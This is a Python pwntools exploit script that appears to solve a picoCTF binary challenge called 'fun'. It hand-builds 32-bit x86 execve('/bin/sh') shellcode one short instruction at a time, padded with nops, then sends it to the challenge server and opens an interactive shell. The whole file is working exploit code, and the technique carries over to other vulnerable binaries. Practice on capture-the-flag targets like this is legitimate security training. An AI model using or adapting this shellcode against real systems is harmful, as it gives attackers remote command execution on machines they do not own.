#!/usr/bin/env python3

from pwn import *

exe = ELF("./fun")

context.binary = exe
context.log_level = "DEBUG"

shellcode = b""
# eax must store value 11
shellcode += asm("xor eax, eax")
shellcode += asm("mov al, 11")

# ebx must have pointer to "/bin/sh\x00"
# push "/sh\x00" first to stack, then "/bin"; push specifically moves esp up on stack by 4 bytes (-4) and places 4 bytes of data pushed at previous esp location (remember little endian)
shellcode += asm("xor ebx, ebx")
shellcode += asm("mov bl, 104") # "h", "\x00" is already set
for i in range(16):
	shellcode += asm("shl ebx")
shellcode += asm("mov bh, 115") # "s"
shellcode += asm("mov bl, 47") # "/"
shellcode += asm("push ebx")
shellcode += asm("nop") # fills in one byte since push ebx instruction is one byte
shellcode += asm("mov bh, 110") # "n"
shellcode += asm("mov bl, 105") # "i"
for i in range(16):
        shellcode += asm("shl ebx")
shellcode += asm("mov bh, 98") # "b"
shellcode += asm("mov bl, 47") # "/"
shellcode += asm("push ebx")
shellcode += asm("nop") # fills in one byte since push ebx instruction is one byte
shellcode += asm("mov ebx, esp")

# ecx and edx should be zero'd out
shellcode += asm("xor ecx, ecx")
shellcode += asm("xor edx, edx")

# make the syscall
shellcode += asm("int 0x80")
print(shellcode)

def conn():
	if True:
		return remote("mercury.picoctf.net", 16460)
	else:
		return process([exe.path])

r = conn()
r.recvuntil(b"run:")
r.sendline(shellcode)
r.interactive()
